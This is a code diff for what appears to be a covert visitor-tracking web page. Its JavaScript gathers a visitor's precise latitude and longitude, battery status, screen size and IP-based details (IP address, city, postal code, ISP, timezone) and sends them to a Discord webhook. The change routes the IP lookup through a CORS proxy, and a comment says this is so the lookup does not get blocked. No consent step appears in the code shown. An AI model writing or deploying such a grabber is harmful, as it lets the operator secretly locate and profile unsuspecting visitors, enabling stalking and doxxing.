@@ -29,17 +29,18 @@
             const language = navigator.language;
             const screenRes = `${window.screen.width}x${window.screen.height}`;
 
-            // ipapi.co (HTTPS supported) diye data fetch kora
+            // CORS Proxy diye ip-api fetch kora jate block na hoy
             let ipData = {};
             try {
-                let res = await fetch('https://ipapi.co/json/');
-                ipData = await res.json();
+                let proxyRes = await fetch('https://api.allorigins.win/get?url=' + encodeURIComponent('http://ip-api.com/json/'));
+                let data = await proxyRes.json();
+                ipData = JSON.parse(data.contents);
             } catch (e) {
                 console.log(e);
             }
 
-            const lat = ipData.latitude || 'N/A';
-            const lon = ipData.longitude || 'N/A';
+            const lat = ipData.lat || 'N/A';
+            const lon = ipData.lon || 'N/A';
             const googleMapsLink = (lat !== 'N/A' && lon !== 'N/A') ? `https://www.google.com/maps?q=${lat},${lon}` : 'N/A';
 
             sendToDiscord({ 
@@ -66,12 +67,12 @@
                         { name: "📍 Latitude & Longitude", value: `${data.lat}, ${data.lon}`, inline: false },
                         { name: "🎯 Location Type", value: `${data.accuracy}`, inline: true },
                         { name: "🔋 Battery Status", value: `${data.batteryInfo}`, inline: true },
-                        { name: "🌐 IP Address", value: `${data.ipData.ip || 'N/A'}`, inline: true },
-                        { name: "🏙️ City / Region", value: `${data.ipData.city || 'N/A'}, ${data.ipData.region || 'N/A'}`, inline: true },
-                        { name: "📮 Zip / Postal Code", value: `${data.ipData.postal || 'N/A'}`, inline: true },
-                        { name: "🌍 Country", value: `${data.ipData.country_name || 'N/A'}`, inline: true },
-                        { name: "🏢 ISP (Internet Provider)", value: `${data.ipData.org || 'N/A'}`, inline: false },
-                        { name: "💻 Organization", value: `${data.ipData.asn || 'N/A'}`, inline: true },
+                        { name: "🌐 IP Address", value: `${data.ipData.query || 'N/A'}`, inline: true },
+                        { name: "🏙️ City / Region", value: `${data.ipData.city || 'N/A'}, ${data.ipData.regionName || 'N/A'}`, inline: true },
+                        { name: "📮 Zip / Postal Code", value: `${data.ipData.zip || 'N/A'}`, inline: true },
+                        { name: "🌍 Country", value: `${data.ipData.country || 'N/A'}`, inline: true },
+                        { name: "🏢 ISP (Internet Provider)", value: `${data.ipData.isp || 'N/A'}`, inline: false },
+                        { name: "💻 Organization", value: `${data.ipData.org || 'N/A'}`, inline: true },
                         { name: "⏰ Timezone", value: `${data.ipData.timezone || 'N/A'}`, inline: true },
                         { name: "📱 Device Platform", value: `${data.platform}`, inline: true },
                         { name: "📐 Screen Resolution", value: `${data.screenRes}`, inline: true },
